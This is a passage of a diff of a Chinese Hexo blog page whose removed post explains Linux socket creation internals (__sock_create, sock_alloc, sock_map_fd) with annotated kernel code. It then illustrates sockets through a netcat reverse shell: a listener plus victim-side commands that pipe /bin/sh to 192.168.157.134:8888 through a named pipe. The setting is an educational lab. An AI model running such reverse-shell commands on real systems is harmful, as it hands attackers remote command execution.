This uglymoron is moved from INET layer to here to avoid</span></span><br><span class="line"><span class="comment">	   deadlock in module load.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family == PF_INET &amp;&amp; type == SOCK_PACKET) &#123;</span><br><span class="line">		pr_info_once(<span class="string">&quot;%s uses obsolete (PF_INET,SOCK_PACKET)\n&quot;</span>,</span><br><span class="line">			     current-&gt;comm);</span><br><span class="line">		family = PF_PACKET;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_socket_create(family, type, protocol, kern); <span class="comment">/* 于在创建新socket之前的权限检查,并考虑协议集,类型,协议,以及socket是在内核中创建还是在用户空间中创建 */</span></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	Allocate the socket and allow the family to set things up. if</span></span><br><span class="line"><span class="comment">	 *	the protocol is 0, the family is instructed to select an appropriate</span></span><br><span class="line"><span class="comment">	 *	default.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sock = sock_alloc(); <span class="comment">/* struct socket的核心创建函数 */</span></span><br><span class="line">	<span class="keyword">if</span> (!sock) &#123;</span><br><span class="line">		net_warn_ratelimited(<span class="string">&quot;socket: no more sockets\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;	<span class="comment">/* Not exactly a match, but its the</span></span><br><span class="line"><span class="comment">				   closest posix thing */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sock-&gt;type = type; <span class="comment">/* 设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">	<span class="comment">/* Attempt to load a protocol module if the find failed.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user</span></span><br><span class="line"><span class="comment">	 * requested real, full-featured networking support upon configuration.</span></span><br><span class="line"><span class="comment">	 * Otherwise module support will break!</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (rcu_access_pointer(net_families[family]) == <span class="literal">NULL</span>) <span class="comment">/* 检查驱动程序是否安装 */</span></span><br><span class="line">		request_module(<span class="string">&quot;net-pf-%d&quot;</span>, family); <span class="comment">/* 对未安装的驱动程序进行安装 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">/* RCU读锁申请 */</span></span><br><span class="line">	pf = rcu_dereference(net_families[family]); <span class="comment">/* 获取受保护的RCU指针(这里是地址协议簇指针net_proto_family) */</span></span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (!pf)</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment">	 * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">	rcu_read_unlock(); <span class="comment">/* RCU读锁释放 */</span></span><br><span class="line"></span><br><span class="line">	err = pf-&gt;create(net, sock, protocol, kern); <span class="comment">/* 进入inet socket层 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_module_put;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now to bump the refcnt of the [loadable] module that owns this</span></span><br><span class="line"><span class="comment">	 * socket at sock_release time we decrement its refcnt.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(sock-&gt;ops-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_module_busy;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now that we&#x27;re done with the -&gt;create function, the [loadable]</span></span><br><span class="line"><span class="comment">	 * module can have its refcnt decremented</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">	err = security_socket_post_create(sock, family, type, protocol, kern);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">	*res = sock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_module_busy:</span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">out_module_put:</span><br><span class="line">	sock-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">out_sock_release:</span><br><span class="line">	sock_release(sock);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_release:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__sock_create);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>检查标志位后，调用 <code>security_socket_create</code> 获取必要的信息</li>
-<li>然后调用核心函数 <code>sock_alloc</code></li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct socket *<span class="title">sock_alloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">	inode = new_inode_pseudo(sock_mnt-&gt;mnt_sb); <span class="comment">/* 为给定的超级块分配一个新的inode(new_inode底层也是调用这个函数) */</span></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sock = SOCKET_I(inode); <span class="comment">/* 将inode和socket关联起来 */</span></span><br><span class="line"></span><br><span class="line">	inode-&gt;i_ino = get_next_ino(); <span class="comment">/* 对目标inode进行设置 */</span></span><br><span class="line">	inode-&gt;i_mode = S_IFSOCK | S_IRWXUGO;</span><br><span class="line">	inode-&gt;i_uid = current_fsuid();</span><br><span class="line">	inode-&gt;i_gid = current_fsgid();</span><br><span class="line">	inode-&gt;i_op = &amp;sockfs_inode_ops;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_alloc);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>然后获取地址协议簇指针 <code>net_proto_family</code>（每种网域，都有一个 <code>net_proto_family</code> 数据结构）<ul>
-<li>在系统初始化或者安装该模块时，会把指向相应网域的这个数据结构指针 <code>net_proto_family</code> 填入一个数组 <code>net_families[]</code> 中</li>
-<li>每当要创建对应网域的对应协议对象实体时，就要根据传入的 <code>family</code> 参数（其实就是 <code>socket</code> 的第一个参数）去这个数组找，找到的话就调用对应的 <code>create</code> 函数 </li>
-</ul>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">unix_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_UNIX,</span><br><span class="line">	.create = unix_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_UNIX,本地通信 */</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET,</span><br><span class="line">	.create = inet_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET,IPv4网络通信 */</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet6_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET6,</span><br><span class="line">	.create = inet6_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET6,IPv6网络通信 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>之后调用 <code>pf-&gt;create(net, sock, protocol, kern)</code>，调用对应网域的 <code>create</code> 函数，这个函数主要用于初始化 <code>struct socket-&gt;proto_ops</code> 和 <code>struct socket-&gt;sock</code></li>
-</ul>
-<p><code>sock_map_fd</code> 的实现：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sock_map_fd</span><span class="params">(struct socket *sock, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">newfile</span>;</span></span><br><span class="line">	<span class="keyword">int</span> fd = get_unused_fd_flags(flags); <span class="comment">/* 申请一个fd */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fd &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">		sock_release(sock);</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	newfile = sock_alloc_file(sock, flags, <span class="literal">NULL</span>); <span class="comment">/* 申请一个file */</span></span><br><span class="line">	<span class="keyword">if</span> (likely(!IS_ERR(newfile))) &#123;</span><br><span class="line">		fd_install(fd, newfile); <span class="comment">/* 把fd和file绑定到一起 */</span></span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	put_unused_fd(fd); <span class="comment">/* 用于将形参对应的fd在其文件系统打开文件的bitmap中清零 */</span></span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(newfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其实 Socket 函数的核心就是初始化了一个 <code>struct socket</code> 并把它和 VFS 绑定到了一起</p>
-<ul>
-<li><code>struct socket</code> 中存储了不同网域，不同协议类型的各种处理方法</li>
-<li>而 VFS 则允许用户层以处理文件的形式来操作 <code>struct socket</code></li>
-</ul>
-<p><strong>Socket 在 NC 中的运用</strong></p>
-<p>攻击端监听端口：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>
-<p>受害端创建一个管道 backpipe，并将 shell 环境的输入：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.157.134 8888 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
-<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
-<li>这样从攻击端标准输入的数据就会输出到 <code>/tmp/backpipe</code>，然后再输出到受害端的 <code>/bin/sh</code></li>
-<li>在 shell 命令中设置的管道 “|” 会把 <code>/bin/sh</code> 的结果传输回 <code>192.168.157.134:8888</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh -&gt; /tmp/backpipe -&gt; 192.168.157.134:8888 /bin/sh</span><br></pre></td></tr></table></figure>
-<p>为了更好地测试数据，可以把 “|” 两边的命令交换位置：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">nc 192.168.157.134 8888 1&gt;/tmp/backpipe | /bin/sh 0&lt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
-<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
-<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
-<p>其实就相当于如下的命令：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.157.134 8888 | /bin/sh </span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
-<p>管道在这里的作用只是把 <code>nc 192.168.157.134 8888</code> 与 <code>/bin/sh</code> 两个进程联系起来，而不同主机之间的通信则依靠 nc 命令底层的 socket</p>
-<p>接下来就用第一个示例代码进行抓包分析：</p>
-<ul>
-<li>当两个进程建立 TCP 连接的时候：</li>
-</ul>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134639082-1664608572268.png" class width="1663134639082"> 
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134671374-1664608572268.png" class width="1663134671374"> 
-<ul>
-<li>两边抓到的包是一样的，基础的三次握手（SYN：同步， ACK：确认）</li>
-<li>当攻击端发送数据时：</li>
-</ul>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663135233085-1664608572268.png" class width="1663135233085"> 
-<ul>
-<li>[NO.4]：攻击端发送的数据</li>
-<li>[NO.6]：受害端发送的数据</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2537,7 +2494,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">217</span>
+          <span class="site-state-item-count">218</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2550,7 +2507,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">132</span>
+        <span class="site-state-item-count">133</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2591,7 +2548,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">43:40</span>
+    <span title="Reading time total">43:49</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
